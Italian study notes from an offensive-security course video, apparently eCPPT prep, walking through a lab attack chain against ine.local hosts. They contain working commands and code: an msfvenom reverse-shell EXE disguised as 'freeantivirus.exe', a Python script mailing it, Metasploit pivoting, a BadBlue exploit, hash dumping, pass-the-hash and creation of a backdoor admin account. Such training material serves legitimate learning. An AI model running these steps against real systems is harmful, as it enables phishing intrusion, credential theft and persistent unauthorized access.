# 024 — Initial Access Via Spear Phishing Attachment (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 24/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [024_Initial Access Via Spear Phishing Attachment.txt](024_Initial Access Via Spear Phishing Attachment.txt) · [024_Initial Access Via Spear Phishing Attachment.srt](024_Initial Access Via Spear Phishing Attachment.srt)

## Concetti chiave

- Lab end-to-end che **mette insieme tutto il modulo**: spear phishing → initial access → post-exploitation → pivoting → lateral movement → persistence.
- **Scenario**: due target — `demo.ine.local` (server SMTP DMZ, Windows Server 2012 R2) e `demo1.ine.local` (workstation interna del dipendente "Bob", non raggiungibile direttamente).
- **Vettore**: email a `bob@ine.local` con allegato `freeantivirus.exe` (rinominato da `backdoor.exe`, payload Meterpreter).
- Esecuzione del payload sul client è **simulata** dal lab — focus didattico sull'attacker side.
- **Chain completa dimostrata**: phishing → Meterpreter session → `getsystem` → `autoroute` → `socks_proxy` → `proxychains nmap` → `portfwd` → exploit BadBlue (`bind_tcp`) → hash dump → `psexec` PtH → persistence (`enable_rdp`).
- **Riferimento eCPPT 2024**: questo è praticamente lo schema di domande tipiche dell'esame — la chain pivoting + lateral movement è quella standard.

## Spiegazione approfondita

### Setup del lab
- 2 target:
  - `demo.ine.local` — server DMZ con SMTP (porta 25, hMailServer SMTPD), Windows Server 2012 R2, raggiungibile dall'attaccante.
  - `demo1.ine.local` — workstation interna, NON raggiungibile direttamente (`ping` fallisce). Il vero target da raggiungere via pivoting.
- 1 attaccante: Kali Linux pre-configurato.
- Target email: `bob@ine.local`.

### Step 1 — Recon iniziale
```bash
nmap -F demo.ine.local      # fast scan, conferma SMTP/25
ping demo1.ine.local        # FAIL → conferma che è isolato in interna
ifconfig                    # individua interfaccia eth1 e IP per LHOST
```

### Step 2 — Generazione del payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=<KALI_IP> LPORT=4444 \
         -f exe -o /root/backdoor.exe
```
Payload: Meterpreter reverse TCP 32-bit. Salvato come `/root/backdoor.exe`, rinominato `freeantivirus.exe` lato email (classico social engineering naming).

### Step 3 — Invio email via Python SMTP
Script `email_send.py` (fornito nella lab documentation):
```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from_addr = "attacker@fake.net"
to_addr   = "bob@ine.local"
filename  = "freeantivirus.exe"   # nome user-visible
attach_path = "/root/backdoor.exe"

msg = MIMEMultipart()
msg["From"] = from_addr
msg["To"]   = to_addr
msg["Subject"] = "Free Antivirus"

part = MIMEBase("application", "octet-stream")
part.set_payload(open(attach_path, "rb").read())
encoders.encode_base64(part)
part.add_header("Content-Disposition", f"attachment; filename={filename}")
msg.attach(part)

with smtplib.SMTP("demo.ine.local", 25) as s:
    s.sendmail(from_addr, to_addr, msg.as_string())
```
NB: nel lab non serve Gophish — basta la libreria `smtplib` perché l'apertura è simulata.

### Step 4 — Multi-handler in Metasploit
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run
```

### Step 5 — Bob apre l'allegato → sessione Meterpreter
- Conferma con `getuid` → di solito `NT AUTHORITY\SYSTEM` o user.
- `sysinfo` → Windows Server 2012 R2 64-bit (in questo lab, `demo.ine.local`).
- `getprivs` per mostrare i privilegi correnti.
- Se necessario: `getsystem` → SYSTEM.

### Step 6 — Verifica raggiungibilità rete interna
```
shell
> ping <IP_demo1>
exit
```
Conferma: dalla macchina compromessa `demo.ine.local` arrivo a `demo1.ine.local` (subnet interna). L'attaccante NO.

### Step 7 — Pivoting: autoroute + SOCKS proxy
```
# nella session di meterpreter
run autoroute -s <INTERNAL_SUBNET> -n 255.255.255.240
# es: run autoroute -s 10.10.20.0/28
background

# fuori dalla session
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050         # deve corrispondere a /etc/proxychains.conf
run -j

# verifica
jobs
netstat -antp | grep 9050
```

### Step 8 — Recon interno via proxychains
```bash
# da nuovo terminale Kali
proxychains nmap -sT -Pn -F demo1.ine.local
# REGOLA: proxychains richiede -sT (TCP connect scan) perché SOCKS è TCP only
# Trova porta 80 → BadBlue
```

### Step 9 — Port forwarding per identificare servizio
```
# dentro la session meterpreter
portfwd add -l 1234 -p 80 -r <IP_demo1>

# da Kali
nmap -sV -p 1234 localhost
# → BadBlue 2.72 (vulnerabile)
```

### Step 10 — Exploit di BadBlue via bind payload
```
search badblue
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp     # bind perché siamo dentro la rete
set RHOSTS <IP_demo1>
set LPORT 5555                                # porta su cui ascolta il bind sul target
set RPORT 80
run
```
Risultato: nuova session Meterpreter su `demo1.ine.local`.

### Step 11 — Hash dump e Pass-the-Hash
```
# in session demo1
getuid                    # NT AUTHORITY\SYSTEM (perché BadBlue gira come system)
pgrep explorer.exe
migrate <PID>             # migra a processo 64-bit stabile
hashdump                  # estrae NTLM Administrator
```
PtH per persistence/lateral consolidato:
```
background
use exploit/windows/smb/psexec
set RHOSTS demo1.ine.local
set SMBUser Administrator
set SMBPass <LM:NTLM_HASH>
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 6666
run
```

### Step 12 — Persistence: enable RDP + custom user
```
search enable_rdp
use post/windows/manage/enable_rdp
set USERNAME alexis
set PASSWORD Password123
set SESSION <id>
run
```
Verifica:
```
shell
net user alexis
net localgroup administrators
```
User `alexis` aggiunto al gruppo Administrators → accesso persistente futuro via RDP (se raggiungibile).

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `nmap -F demo.ine.local` | Fast scan per individuare servizi DMZ | |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=4444 -f exe -o backdoor.exe` | Genera EXE Meterpreter | |
| `python3 email_send.py` | Invio email SMTP con allegato | `smtplib` + `MIMEMultipart` |
| `use exploit/multi/handler` | Handler per reverse shell | |
| `getsystem` / `getprivs` | Elevazione privilegi Meterpreter | |
| `run autoroute -s <subnet>` | Aggiunge route Metasploit verso subnet interna | Prerequisito per qualsiasi pivoting MSF |
| `use auxiliary/server/socks_proxy` + `set VERSION 4a` + `set SRVPORT 9050` | SOCKS proxy via session pivotata | Porta deve matchare `proxychains.conf` |
| `proxychains nmap -sT -Pn <target>` | Scan via SOCKS | **SEMPRE `-sT`** (TCP connect) — SOCKS non supporta raw |
| `portfwd add -l <lport> -p <rport> -r <ip>` | Port forwarding 1:1 dentro Meterpreter | Alternativa al socks proxy per singola porta |
| `hashdump` | Dump SAM (richiede SYSTEM) | |
| `migrate <PID>` | Migra Meterpreter in processo stabile | |
| `use exploit/windows/smb/psexec` + `SMBPass <HASH>` | PtH lateral | LM:NTLM o solo NTLM |
| `use post/windows/manage/enable_rdp` | Persistence: abilita RDP + crea user | |

## Esempi pratici

```bash
# 1. Genera payload e invia email
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o /root/backdoor.exe
chmod +x email_send.py
python3 email_send.py

# 2. Handler in attesa
msfconsole -q
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 10.10.10.5
> set LPORT 4444
> run -j

# 3. Sessione su demo.ine.local arriva
sessions -i 1
meterpreter > getsystem
meterpreter > run autoroute -s 10.10.20.0/28
meterpreter > background

# 4. SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run -j

# 5. Pivot scan
proxychains nmap -sT -Pn -F 10.10.20.5
# Identifica BadBlue su porta 80

# 6. Exploit BadBlue via bind
use exploit/windows/http/badblue_passthru
set RHOSTS 10.10.20.5
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 5555
run

# 7. Post-ex demo1
meterpreter > getuid       # NT AUTHORITY\SYSTEM
meterpreter > pgrep explorer.exe
meterpreter > migrate 2796
meterpreter > hashdump

# 8. PtH per consolidare
use exploit/windows/smb/psexec
set RHOSTS 10.10.20.5
set SMBUser Administrator
set SMBPass aad3b435...:31d6cfe0...
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 6666
run
```

## Punti d'attenzione per l'esame eCPPT

- **proxychains** richiede `-sT -Pn` per Nmap (TCP connect + skip host discovery). Domanda classica.
- **Default SOCKS port** Metasploit moderno: **9050** (lo stesso di `proxychains.conf`). Era 1080 nei tutorial vecchi.
- **`bind_tcp` vs `reverse_tcp`**: dopo `autoroute` puoi raggiungere il target interno, ma il target non può tornare a te — usa **`bind_tcp`** (target apre porta in ascolto, tu ti connetti).
- **`autoroute` aggiunge route Metasploit-side** — visibile in `route print` dentro msfconsole. Non visibile da Linux.
- **`portfwd` vs `socks_proxy`**: portfwd = singola porta 1:1, socks_proxy = qualsiasi porta via proxychains.
- **`hashdump`**: richiede SYSTEM. Se non hai SYSTEM → `getsystem` o `migrate` su processo SYSTEM (es. `lsass.exe`).
- **PtH via psexec**: il formato hash è `LMHASH:NTLMHASH` (oppure solo `:NTLMHASH` se LM è vuoto/aad3b435...).
- **`enable_rdp`**: post module, non exploit. Aggiunge user al gruppo Administrators + Remote Desktop Users + abilita servizio.
- La chain `phishing → autoroute → socks → proxychains nmap → exploit interno` è il **template più comune** delle domande eCPPT.

## Collegamenti con altri video

- Precedente: [[023_File Smuggling with HTML & JavaScript]] — vettore delivery alternativo.
- Prossimo: [[025_Establishing a Shell Through the Victim's Browser]] — initial access via browser/BeEF.
- Resource development payload: [[010_Resource Development & Weaponization]]
- Phishing infrastructure: [[08_Phishing with Gophish - Part 1]] · [[09_Phishing with Gophish - Part 2]]
- Pivoting standalone: [[012_Pivoting & Port Forwarding with Metasploit]] · [[013_Pivoting with SOCKS Proxy]]
- PtH dettaglio: [[09_Pass-the-Hash with Metasploit]] · [[010_Pass-the-Hash with WMIExec]]
- Hash dump in AD: [[024_Dumping___Cracking_NTLM_Hashes.mp4]]
